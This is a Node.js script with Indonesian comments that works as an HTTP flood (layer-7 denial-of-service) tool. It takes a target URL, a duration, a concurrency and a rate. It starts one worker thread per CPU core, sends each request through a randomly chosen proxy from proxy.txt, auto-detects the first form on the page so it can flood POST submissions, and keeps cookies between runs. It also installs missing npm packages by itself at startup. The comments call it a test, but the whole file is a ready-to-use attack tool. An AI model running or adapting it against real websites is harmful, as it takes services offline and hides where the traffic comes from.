const fs = require('fs');
const { execSync } = require('child_process');
const axios = require('axios');
const HttpsProxyAgent = require('https-proxy-agent');
const Bottleneck = require('bottleneck');
const { Worker, isMainThread, workerData } = require('worker_threads');
const os = require('os');
const process = require('process');
const CookieJar = require('tough-cookie').CookieJar;
const axiosCookieJarSupport = require('axios-cookiejar-support');
const cheerio = require('cheerio');
const { promisify } = require('util');
const writeFile = promisify(fs.writeFile);
const readFile = promisify(fs.readFile);

// Nama file untuk menyimpan cookies
const cookieFile = 'cookies.json';

// Fungsi untuk memeriksa dan menginstal dependensi
function installDependencies() {
    const dependencies = ['axios', 'https-proxy-agent', 'bottleneck', 'tough-cookie', 'axios-cookiejar-support', 'cheerio'];
    dependencies.forEach(dep => {
        try {
            require.resolve(dep);
            console.log(`${dep} sudah terinstal.`);
        } catch {
            console.log(`${dep} tidak ditemukan. Menginstal...`);
            execSync(`npm install ${dep}`, { stdio: 'inherit' });
        }
    });
}

// Memastikan dependensi terinstal
installDependencies();

// Mengambil parameter dari baris perintah
const [,, url, duration, concurrentRequests, rateLimit] = process.argv;

// Validasi parameter
if (!url || !duration || isNaN(concurrentRequests) || !Number.isInteger(Number(concurrentRequests)) ||
    isNaN(rateLimit) || rateLimit <= 0) {
    console.error('Penggunaan: node file.js <website_tujuan> <durasi> <thread> <rate_limit>');
    process.exit(1);
}

// Menentukan jumlah pekerja otomatis berdasarkan inti CPU
const numWorkers = os.cpus().length;

// Membaca daftar proxy dari file proxy.txt
const proxyFile = 'proxy.txt';
const proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(line => line.trim()).filter(line => line !== '');

// Buat limiter untuk mengatur rate-limiting
const limiter = new Bottleneck({
    maxConcurrent: Number(concurrentRequests),
    minTime: 1000 / rateLimit // Mengatur rate limit per detik
});

// Inisialisasi CookieJar untuk menangani cookies
const cookieJar = new CookieJar();
axiosCookieJarSupport.default(axios, cookieJar);

// Fungsi untuk menyimpan cookies ke file
async function saveCookies() {
    const cookies = cookieJar.serializeSync();
    await writeFile(cookieFile, JSON.stringify(cookies, null, 2));
}

// Fungsi untuk memuat cookies dari file
async function loadCookies() {
    try {
        const data = await readFile(cookieFile, 'utf-8');
        const cookies = JSON.parse(data);
        cookieJar.deserializeSync(cookies);
    } catch (error) {
        console.error('Tidak dapat memuat cookies:', error.message);
    }
}

// Fungsi untuk mendeteksi metode dan data payload secara otomatis
async function detectMethodAndData() {
    try {
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);

        // Deteksi formulir dengan metode POST
        const form = $('form').first();
        if (form.length > 0) {
            const action = form.attr('action') || url;
            const inputs = form.find('input').map((_, input) => {
                return { name: $(input).attr('name'), value: $(input).attr('value') || '' };
            }).get();

            if (inputs.length > 0) {
                return { method: 'POST', data: new URLSearchParams(inputs.map(input => `${input.name}=${input.value}`)).toString() };
            }
        }

        return { method: 'GET', data: null };
    } catch (error) {
        console.error('Error mendeteksi metode dan data:', error.message);
        return { method: 'GET', data: null }; // Default ke GET jika ada kesalahan
    }
}

// Fungsi untuk mengirim permintaan melalui proxy
async function sendRequest(proxy, method = 'GET', data = null) {
    const proxyUrl = `http://${proxy}`; // Menggunakan HTTP proxy
    const agent = new HttpsProxyAgent(proxyUrl);

    try {
        const response = await axios({
            url: url,
            method: method,
            data: data,
            httpAgent: agent,
            httpsAgent: agent,
            jar: cookieJar // Menggunakan CookieJar untuk menyimpan cookies
        });
        return response;
    } catch (error) {
        console.error('Error:', error.message);
    }
}

// Fungsi pekerja untuk mengirim permintaan
async function workerFunction(method, data) {
    const endTime = Date.now() + duration * 1000;
    const requests = [];

    while (Date.now() < endTime) {
        if (requests.length >= concurrentRequests) {
            await Promise.race(requests); // Tunggu hingga salah satu permintaan selesai
        }
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
        requests.push(limiter.schedule(() => sendRequest(proxy, method, data)));
    }
    await Promise.all(requests);
    console.log('Semua permintaan selesai oleh pekerja');
}

// Fungsi utama untuk membuat pekerja
async function startTest() {
    if (isMainThread) {
        console.log(`Memulai dengan ${numWorkers} pekerja...`);

        // Muat cookies jika tersedia
        await loadCookies();

        // Deteksi metode dan data
        const { method, data } = await detectMethodAndData();
        console.log(`Metode yang digunakan: ${method}`);
        console.log(`Data payload: ${data}`);

        const workers = [];
        for (let i = 0; i < numWorkers; i++) {
            workers.push(new Worker(__filename, { workerData: { url, duration, concurrentRequests, rateLimit, method, data } }));
        }

        // Tunggu semua pekerja selesai
        await Promise.all(workers.map(worker => new Promise(resolve => worker.on('exit', resolve))));
        console.log('Semua pekerja selesai');

        // Simpan cookies setelah selesai
        await saveCookies();
    } else {
        const { url, duration, concurrentRequests, rateLimit, method, data } = workerData;
        await workerFunction(method, data);
    }
}

// Jalankan pengujian
startTest();
